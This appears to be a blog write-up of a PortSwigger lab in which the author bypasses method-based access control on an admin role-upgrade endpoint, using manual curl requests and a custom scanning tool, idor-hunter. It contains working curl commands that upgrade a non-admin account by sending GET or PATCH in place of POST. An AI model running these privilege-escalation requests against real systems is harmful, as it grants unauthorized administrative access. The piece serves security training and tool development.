# Using idor-hunter on PortSwigger: Method-based access control can be circumvented

*Third real-world run of idor-hunter. The analyzer didn't fire on this one — by design. But the raw probe data revealed the vulnerability clearly, plus a second bypass method the lab doesn't advertise.*

## The lab

PortSwigger Web Security Academy: [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented).

The admin panel has a user-upgrade form that POSTs to `/admin-roles` with `username` and `action=upgrade` parameters. The server checks *"is this a POST? is the user admin?"* — but forgets the same check on other HTTP methods. Send the same request as a GET (with params in the query string) from a non-admin session, and the upgrade goes through.

## Manual solve

Logged in as administrator first to see the legitimate request. From DevTools → Network tab, the upgrade button fires:

```
POST /admin-roles
Content-Type: application/x-www-form-urlencoded
Cookie: session=<admin>
Body: username=wiener&action=upgrade
```

Logged out, logged in as `wiener:peter`, grabbed wiener's session cookie from DevTools, then:

```bash
WIENER_COOKIE="..."
LAB="https://<lab>.web-security-academy.net"

# Confirm POST is denied (expected)
curl -s -o /dev/null -w "POST: %{http_code}\n" \
  -b "session=$WIENER_COOKIE" \
  -X POST -d "username=wiener&action=upgrade" \
  "$LAB/admin-roles"
# → POST: 401

# The exploit — GET with params in the query string
curl -s -o /dev/null -w "GET:  %{http_code}\n" \
  -b "session=$WIENER_COOKIE" \
  "$LAB/admin-roles?username=wiener&action=upgrade"
# → GET:  302
```

Refreshed the lab page. Solved.

## Running the tool

Hypothesis going in: the lab tests method-based auth bypass. My tool's Check 3 (`write_without_read`) was the only method-related check in the analyzer. It's specced for the inverse of this bug class — "user can write but can't read" — so I expected 0 findings, but useful probe data.

Configured a one-user scan that iterates all five common HTTP methods against the upgrade endpoint:

```yaml
target:
  base_url: "https://<lab>.web-security-academy.net"
auth:
  users:
    - name: wiener
      cookies:
        session: "<wiener session>"
scans:
  - name: "admin-roles method bypass"
    endpoint: "/admin-roles?username={id}&action=upgrade"
    methods: [GET, POST, PUT, PATCH, DELETE]
    ids:
      type: list
      values: ["wiener", "carlos"]
    baseline_user: wiener
    include_unauth: true
options:
  rate_limit: 2
```

Ran:

```
$ idor-hunter -c lab-scan.yaml -o ./lab-test

  target:  https://<lab>.web-security-academy.net
  users:   1
  scans:   1
  probes:  ~20
  scanning [██████████████████████████████] 20/20 (100.0%)

  probes:    20
  findings:  0
```

Zero findings, as expected. But the probe data is where the story lives:

| User | GET | POST | PUT | PATCH | DELETE |
|------|-----|------|-----|-------|--------|
| wiener | **302** | 400 | 400 | **302** | 400 |
| unauth | 401 | 401 | 401 | 401 | 401 |

Two methods (GET and PATCH) succeed for wiener where POST fails. The lab only advertises GET as the bypass; PATCH is a second unintended path.

## Bonus finding: PATCH bypass

Manual exploration only tested GET — that's what the lab title hints at, and once it worked I stopped looking. The tool's `methods: [GET, POST, PUT, PATCH, DELETE]` enumeration revealed PATCH also bypasses the check. Confirmed with curl:

```
$ curl -s -o /dev/null -w "%{http_code}\n" \
    -X PATCH \
    -b "session=$WIENER_COOKIE" \
    "$LAB/admin-roles?username=wiener&action=upgrade"
302
```

Two working exploit paths where the lab only teaches one. This is the kind of coverage gain that mechanical enumeration provides over manual hunting — easy to forget to test PATCH manually when the title primes you to try GET.

Some frameworks (Express, Django) route GET and PATCH through similar handler chains; a `if request.method == "POST"` auth check leaves both cracks open for the same reason.

## Why the analyzer didn't fire

Check 3 (`write_without_read`) is specced for the inverse of this bug — *user can successfully write but can't read*. Its predicate:

```python
if method in {"PUT", "PATCH", "DELETE", "POST"}:
    if probe.status in {200, 201, 202, 204}:   # _SUCCESS_STATUSES
        if get_probe.status in {401, 403, 404}:  # _DENIAL_STATUSES
            fire("write_without_read")
```

Two reasons this misses the method-bypass lab:

1. **302 isn't in `_SUCCESS_STATUSES`.** The lab returns 302 on the successful GET/PATCH bypass. A tighter predicate could include 3xx for state-changing methods, but that's a noisy signal in general — most 302s are login redirects, not successful side-effects.
2. **Check 3 wants GET-denied, not GET-succeeded.** The lab's bug is the opposite: GET *succeeds* on an endpoint that should require POST. The predicate looks for the wrong asymmetry direction.

Neither is a bug in Check 3. The predicate correctly models "write endpoint skipped its ownership check," which is a different (and more common) class of bug than "read endpoint performs write side-effect."

## What this suggests for a future release

A new analyzer check would catch this class cleanly. Working title `method_asymmetry`:

> For each `(endpoint, id, user)`, collect the set of statuses across all probed methods. If the set contains both a "substantive success" (200/201/202 or 302 with a Location header) and a clear denial (401/403/400), emit a medium-severity finding. Exclude the case where only 404 and denials appear (nonexistent resource), since that's legitimate uniform rejection.

Filed as an issue on the repo. Not landing in v0.4 — that release is already scoped to multi-placeholder paths and Burp/HAR import, and stacking two analyzer changes in consecutive releases is how regressions sneak in. Queued for v0.5.

## Takeaways

- **The tool didn't catch the bug via its analyzer, but the scan data caught it trivially.** This reinforces a pattern from the Corridor writeup: even when the analyzer's checks don't match a given bug class, the probe CSV is useful structured recon that a human can pivot on.
- **The analyzer has a specific, nameable coverage gap** — method asymmetry where the "unexpected" method succeeds. Worth adding as a check in a future release. Filed; deferred to v0.5.
- **Mechanical enumeration found a bypass I missed manually.** PATCH works too. Small win, real value, textbook argument for fuzzing methods even when one working exploit is already known.

## Scan config reproduced

```yaml
target:
  base_url: "https://<lab>.web-security-academy.net"
auth:
  users:
    - name: wiener
      cookies: {session: "<session cookie>"}
scans:
  - name: "admin-roles method bypass"
    endpoint: "/admin-roles?username={id}&action=upgrade"
    methods: [GET, POST, PUT, PATCH, DELETE]
    ids:
      type: list
      values: ["wiener", "carlos"]
    baseline_user: wiener
    include_unauth: true
options:
  rate_limit: 2
  timeout: 10
  verify_tls: true
```